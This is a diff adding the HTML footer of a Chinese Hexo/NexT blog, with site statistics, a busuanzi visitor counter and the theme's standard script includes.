+  <span class="author" itemprop="copyrightHolder">As1def</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">147k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:13</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i>
+<span id="busuanzi_container_site_uv">
+本站总访客数:<span id="busuanzi_value_site_uv"></span>&nbsp;&nbsp;| 
+</span>
+<span id="busuanzi_container_site_pv">
+  &nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script type="text/javascript" src="/js/firework.js"></script>
+</body>
+</html>
